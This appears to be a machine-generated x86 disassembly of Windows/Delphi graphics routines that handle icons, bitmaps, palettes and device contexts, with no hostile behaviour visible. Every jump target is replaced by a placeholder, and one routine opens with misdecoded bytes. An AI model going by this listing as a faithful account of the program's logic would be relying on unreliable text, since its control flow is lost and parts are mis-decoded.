push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41ef14
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b04
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41ef08
xor edx edx
push ebp
push sub_41f102
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41edd4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41edd4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f0db
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407914
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407914
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407914
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407914
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41ee40
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41ee40
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0e2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f0e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f109
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f110
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41f160
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f1b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f160
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f201
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403040
mov edi eax
mov eax esi
call sub_403040
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f33b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f31e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407a40
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f325
mov al 0x1
sub_41f354
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415f28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3a3
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_41f3a8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41f3dc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415f28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f427
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f42e
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_41f4f0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413df4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f58e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f595
mov eax [ rw-data ]
call sub_413e58
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_41f566
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_41f680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dab4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139f4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41da58
test al al
je r-xdata
sub_41f59c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413df4
mov esi eax
xor ecx ecx
push ebp
push sub_41f60c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax esi
call sub_4139f4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_41f680
sub_41f618
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d644
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41f654
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_41f680
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d708
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41f680
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d948
xor edx edx
push ebp
push sub_41f714
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dc3c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413e08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dab4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_41f720
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d948
xor eax eax
push ebp
push sub_41f7ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_420a3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_41f59c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_420b3c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dc3c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dab4
retn
sub_41f810
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4030f8
sub_41f830
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_41f59c
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cc80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41f88c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41bf98
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_41f59c
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_41f59c
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_41f8d8
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e73c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f987
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f994
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_41f9e0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f59c
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41dfa8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_42002e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41fd38
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41de94
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41dfa8
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41dfa8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41dfa8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41dfa8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41ffdf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41ffce
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41ffac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41dfa8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_41f994
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e73c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d528
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_4125c0
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c868
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
call sub_41c868
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41df00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffb3
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_41ff82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41dfa8
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c868
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
call sub_41c868
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c868
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d4ec
call sub_41c868
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41dfa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403918
call sub_403918
jmp r-xdata
sub_41ffd5
xor eax eax
